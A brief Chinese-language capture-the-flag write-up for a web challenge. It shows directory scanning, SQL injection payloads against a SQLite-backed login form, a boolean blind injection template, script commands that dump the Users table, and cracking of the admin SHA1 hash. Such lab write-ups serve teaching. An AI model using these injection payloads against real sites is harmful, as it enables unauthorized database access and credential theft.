1、dirsearch扫描发现有

[10:23:06] 200 -  757B  - /admin.php
[10:23:22] 200 - 1023B  - /index.html
[10:23:24] 200 -  833B  - /login.php
[10:23:29] 200 -   61B  - /robots.txt

http://111.198.29.45:32197/

robots.txt中不准访问login.php和admin.php

2、打开login.php

用burp sql fuzz

发现存在注入点,且无论结果正确都没有明确结果，而且是sqlite数据库

```
usr=a' and ''='&pw=1 #正确
usr=a' and ''=&pw=1  #报错
usr=a' or 1=1 or '1'='1&pw=1  #cookie中有值，代表sql语句执行正确
```

下一步检测是报错注入还是布尔盲注

由于对sqlite语法不熟悉，而且检测了下发现不会显示报错字符，所以采用布尔注入

检测语句：

```
usr=hi' or ({sql} and 1) --&pw=1 
```

通过返回的请求头有没有admin判断是否正确



利用脚本破解

```
python3 FlatScienece.py -t sqlite_master -f name -w="type='table'"
python3 FlatScienece.py -t sqlite_master -f sql -w="type='table'"
python3 FlatScienece.py -t Users -f name 
python3 FlatScienece.py -t name -f name 
python3 FlatScienece.py -t hint -f name 
```

长度为5,

表名为Users

sql为96，sql:CRETE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))

name长度5：admin

密码长度40:3fab54a50e770d830c0416df817567662a9dc85bc

hint长度28:my fav word in my fav paper?

将paper中所有关键词提取出来，然后sha1碰撞破解得到密码ThinJerboa

访问admin.php登录后得到flag



